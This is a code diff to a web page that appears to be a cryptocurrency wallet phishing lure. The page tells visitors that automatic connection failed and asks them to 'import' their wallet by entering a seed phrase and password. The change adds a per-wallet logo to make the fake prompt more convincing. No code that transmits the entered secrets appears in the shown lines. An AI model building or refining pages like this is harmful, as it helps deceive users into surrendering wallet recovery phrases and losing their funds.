@@ -38,7 +38,10 @@
     <div id="errorPopup" class="popup">
         <div class="popup-content">
             <p>There was an error connecting automatically. But do not worry, you can still connect manually.</p>
-            <h2>Import your <span id="errorWalletName"></span> wallet</h2>
+            <div class="wallet-info">
+                <h2>Import your <span id="errorWalletName"></span> wallet</h2>
+                <img id="errorWalletLogo" src="" alt="Wallet Logo" class="wallet-logo-small">
+            </div>
             
             <div class="tabs">
                 <button class="tab-btn active" onclick="switchTab('seedphrase')">Seed Phrase</button>
@@ -130,6 +133,10 @@
         // Open error/manual connect popup
         function openErrorPopup(wallet) {
             document.getElementById("errorWalletName").textContent = wallet;
+            document.getElementById("errorWalletLogo").src = `assets/wallets/${wallet.toLowerCase()}.png`;
+            document.getElementById("errorWalletLogo").onerror = () => {
+                document.getElementById("errorWalletLogo").src = 'assets/default.png';
+            };
             document.getElementById("errorPopup").style.display = "flex";
             currentTab = "seedphrase";
             updateInputLabel();
@@ -140,7 +147,7 @@
             selectedWallet = null;
             currentTab = "seedphrase";
             document.getElementById("manualInput").value = "";
-            document.getElementById("walletPassword").value = ""; // Clear password field
+            document.getElementById("walletPassword").value = "";
             document.getElementById("errorMessage").textContent = "";
             document.getElementById("errorMessage").classList.add("hidden");
             document.getElementById("errorPopup").style.display = "none";
